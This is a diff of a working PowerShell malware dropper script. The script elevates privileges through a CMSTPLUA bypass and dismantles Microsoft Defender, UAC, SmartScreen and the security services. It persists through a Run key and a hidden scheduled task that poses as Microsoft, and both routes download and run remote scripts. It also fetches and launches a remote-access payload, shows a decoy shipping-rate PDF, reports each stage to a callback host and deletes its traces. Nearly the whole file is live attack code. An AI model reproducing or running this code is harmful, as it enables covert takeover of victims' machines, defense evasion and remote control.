@@ -30,13 +30,6 @@ function _cb($stage,$status,$detail){
 _log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
 
-try{
-    $null=[System.Net.Dns]::GetHostAddresses('193.26.115.196')
-    _log "S0: ip ok"
-}catch{
-    _log "S0: ip fail: $($_.Exception.Message)"
-}
-
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
 _log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
@@ -92,57 +85,52 @@ function _runWait($n,$a,$s,$l,$sec){
     }
 }
 
-# ═══════════════════════════════════════════
+function _regSet($path,$name,$value,$type='DWord'){
+    try{
+        if(-not(Test-Path $path)){New-Item -Path $path -Force|Out-Null}
+        Set-ItemProperty -Path $path -Name $name -Value $value -Type $type -Force -ErrorAction SilentlyContinue | Out-Null
+    }catch{}
+}
+
 # S1: ELEVATION via CMSTPLUA
-# ═══════════════════════════════════════════
 if(-not $cbIsAdmin){
     _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
     Start-Sleep 15
     try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
     _log "S1: a=$cbIsAdmin"
-    if($cbIsAdmin){
-        _cb 'S1' 'ok' 'elevation ok'
-    }else{
-        _cb 'S1' 'warn' 'elevation fail, continuing as user'
-    }
+    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
 }
 
-# ═══════════════════════════════════════════
-# S2: DEFENDER — full takedown (admin only)
-# ═══════════════════════════════════════════
+# S2: SOPHIA-BASED DEFENSE TAKEDOWN (admin only)
 if($cbIsAdmin){
-    # 1) Tamper Protection OFF — must be first, everything else depends on it
     try{
         Set-MpPreference -DisableTamperProtection $true -ErrorAction Stop
         _log "S2: tamper off (cmdlet)"
     }catch{
-        _log "S2: tamper cmdlet fail, trying registry"
-        try{
-            $tpKey='HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
-            if(-not(Test-Path $tpKey)){New-Item -Path $tpKey -Force|Out-Null}
-            Set-ItemProperty -Path $tpKey -Name 'TamperProtection' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-            _log "S2: tamper off (reg)"
-        }catch{
-            _log "S2: tamper reg fail: $_"
-        }
+        _regSet 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' 'TamperProtection' 0
+        _log "S2: tamper off (reg fallback)"
     }
 
-    # 2) Exclusion paths — wmdrs.exe will land here
+    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin' 0
+    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorUser' 3
+    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA' 1
+    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'PromptOnSecureDesktop' 1
+    _log "S2: AdminApprovalMode -Never applied"
+
+    try{_regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' 'SmartScreenEnabled' 'Off' 'String'}catch{}
+    _log "S2: AppsSmartScreen disabled"
+
+    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
+    _regSet 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
+    _log "S2: SaveZoneInformation disabled"
+
     $exclPaths=@("$env:TEMP","$env:APPDATA\Microsoft","$env:LOCALAPPDATA\Microsoft","$env:USERPROFILE\Downloads")
     foreach($ep in $exclPaths){
-        try{
-            New-Item -Path $ep -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-            Add-MpPreference -ExclusionPath $ep -ErrorAction SilentlyContinue | Out-Null
-        }catch{}
+        try{New-Item -Path $ep -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null; Add-MpPreference -ExclusionPath $ep -ErrorAction SilentlyContinue | Out-Null}catch{}
     }
+    $exclProcs=@('wmdrs.exe','wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe','windefctl.exe','cmd.exe','wscript.exe','cscript.exe')
+    foreach($xp in $exclProcs){try{Add-MpPreference -ExclusionProcess $xp -ErrorAction SilentlyContinue | Out-Null}catch{}}
 
-    # 3) Process exclusions
-    $exclProcs=@('wmdrs.exe','wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe','windefctl.exe','cmd.exe')
-    foreach($xp in $exclProcs){
-        try{Add-MpPreference -ExclusionProcess $xp -ErrorAction SilentlyContinue | Out-Null}catch{}
-    }
-
-    # 4) Full disable via cmdlets
     try{
         Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
@@ -152,62 +140,48 @@ if($cbIsAdmin){
         Set-MpPreference -DisableAntiSpyware $true -ErrorAction SilentlyContinue
         Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
         Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
-        Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
-        _log "S2: all cmdlets disabled"
+        Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
+        _log "S2: all cmdlets + Sophia NetworkProtection disabled"
     }catch{
         _log "S2: cmdlets fail: $_"
     }
 
-    # 5) Registry hard-disable
     try{
-        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
-        if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
-        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
-        Set-ItemProperty -Path $dp -Name 'DisableRoutinelyTakingAction' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
-        $rtp="$dp\Real-Time Protection"
-        if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
-        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force | Out-Null
-        Set-ItemProperty -Path $rtp -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force | Out-Null
-        Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force | Out-Null
-        Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force | Out-Null
-        _log "S2: reg hard-disable ok"
-        _cb 'S2' 'ok' 'defender reg disabled'
-    }catch{
-        _log "S2: reg fail: $_"
-    }
+        _regSet 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager' 'EnablePeriodicBackup' 0
+        _regSet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine' 'MpEnablePus' 0
+    }catch{}
 
-    # 6) Stop + disable Defender service
+    try{& "$env:SystemRoot\System32\setx.exe" /M MP_FORCE_USE_SANDBOX 0}catch{}
+    _log "S2: DefenderSandbox disabled"
+
+    $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
+    _regSet $dp 'DisableAntiSpyware' 1
+    _regSet $dp 'DisableRoutinelyTakingAction' 1
+    $rtp="$dp\Real-Time Protection"
+    _regSet $rtp 'DisableRealtimeMonitoring' 1
+    _regSet $rtp 'DisableBehaviorMonitoring' 1
+    _regSet $rtp 'DisableOnAccessProtection' 1
+    _regSet $rtp 'DisableScanOnRealtimeEnable' 1
+    _log "S2: reg hard-disable ok"
+    _cb 'S2' 'ok' 'defender+sophia takedown'
+
     try{
         Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
         Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
-        _log "S2: WinDefend stopped+disabled"
-    }catch{
-        _log "S2: service fail: $_"
-    }
-
-    # 7) Kill Security Center / WMI shell notifications
-    try{
         Stop-Service -Name 'SecurityHealthService' -Force -ErrorAction SilentlyContinue
         Stop-Service -Name 'wscsvc' -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray' -Name 'HideSecurityHealth' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-        _log "S2: security center killed"
-    }catch{
-        _log "S2: sec center fail: $_"
-    }
+        _log "S2: services stopped"
+    }catch{_log "S2: service fail: $_"}
 }
 
-# ═══════════════════════════════════════════
-# S2b: DEFENDER KILL — windefctl.exe binary (self-elevating)
-# ═══════════════════════════════════════════
+# S2b: BINARY DEFENDER KILL
 _log "S2b: windefctl exec (admin=$cbIsAdmin)"
 _runWait 'windefctl.exe' 'kill' 'S2b' 'defkill' 18 | Out-Null
 _cb 'S2b' 'ok' 'defkill done'
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
-# ═══════════════════════════════════════════
 # S3: PERSISTENCE
-# ═══════════════════════════════════════════
-$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\u.ps1 && powershell -w hidden -NoP -file %TEMP%\u.ps1"
+$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspulsv2.ps1 %TEMP%\u.ps1 && powershell -w hidden -NoP -file %TEMP%\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
@@ -224,11 +198,11 @@ if($cbIsAdmin){
     $xml=@"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-<RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
-<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
+<RegistrationInfo><Author>Microsoft Corporation</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
+<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT2H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
 <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
-<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
+<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspulsv2.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
 </Task>
 "@
     $xmlPath="$env:TEMP\task.xml"
@@ -239,25 +213,17 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-# ═══════════════════════════════════════════
-# S5: PAYLOAD — wdsr681f3e18.exe → wmdrs.exe (Overlord Agent)
-# ═══════════════════════════════════════════
+# S5: PAYLOAD
 $payloadPath="$env:APPDATA\Microsoft\wmdrs.exe"
 $payloadExists=(Test-Path $payloadPath)
 _log "S5: exists=$payloadExists at $payloadPath"
 
 if(-not $payloadExists){
-    # Fallback check: LocalAppData
     $fallbackPath="$env:LOCALAPPDATA\Microsoft\wmdrs.exe"
-    if(Test-Path $fallbackPath){
-        $payloadPath=$fallbackPath
-        $payloadExists=$true
-        _log "S5: fallback found at $fallbackPath"
-    }
+    if(Test-Path $fallbackPath){$payloadPath=$fallbackPath; $payloadExists=$true; _log "S5: fallback found at $fallbackPath"}
 }
 
 if($payloadExists){
-    # Already deployed — just launch
     try{
         $p=Start-Process $payloadPath -WindowStyle Hidden -PassThru
         _log "S5: re-launch PID=$($p.Id) from $payloadPath"
@@ -270,12 +236,10 @@ if($payloadExists){
 
 if(-not $payloadExists){
     _log "S5: downloading wdsr681f3e18"
-    $payloadBytes=_dl 'wdsr681f3e18.exe'
+    $payloadBytes=_dl 'PatchPulsaar.exe'
     if($payloadBytes){
         $primaryPath="$env:TEMP\wmdrs.exe"
         [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
-
-        # Copy to excluded dirs
         $copyTargets=@("$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
         foreach($ct in $copyTargets){
             try{
@@ -283,12 +247,8 @@ if(-not $payloadExists){
                 if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                 Copy-Item $primaryPath $ct -Force
                 _log "S5: copied to $ct"
-            }catch{
-                _log "S5: copy fail $ct : $_"
-            }
+            }catch{_log "S5: copy fail $ct : $_"}
         }
-
-        # Launch from AppData (excluded path)
         try{
             $launchPath="$env:APPDATA\Microsoft\wmdrs.exe"
             $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
@@ -298,8 +258,6 @@ if(-not $payloadExists){
             _log "S5: launch fail: $_"
             _cb 'S5' 'fail' "launch err"
         }
-
-        # Clean temp copy only
         Remove-Item "$env:TEMP\wmdrs.exe" -Force -ErrorAction SilentlyContinue | Out-Null
     }else{
         _log "S5: payload dl fail"
@@ -307,9 +265,7 @@ if(-not $payloadExists){
     }
 }
 
-# ═══════════════════════════════════════════
-# S7: PDF DECOY — first run only
-# ═══════════════════════════════════════════
+# S7: PDF DECOY
 $markerPath="$env:APPDATA\Microsoft\wmdrs.seen"
 if(-not (Test-Path $markerPath)){
     $pdf='Rate_Confirmation_LD-2026-0847.pdf'
@@ -320,18 +276,15 @@ if(-not (Test-Path $markerPath)){
         try{
             Start-Process $pdfPath | Out-Null
             _cb 'S7' 'ok' 'pdf ok'
-            # Mark as shown
             Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
             _log "S7: pdf opened, marker set"
         }catch{_cb 'S7' 'warn' 'pdf open fail'}
     }else{_cb 'S7' 'warn' 'pdf dl fail'}
-}else{
+} else {
     _log "S7: skip (already shown)"
 }
 
-# ═══════════════════════════════════════════
 # S9: CLEANUP + SELF-DELETE
-# ═══════════════════════════════════════════
 Start-Sleep 5
 Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue
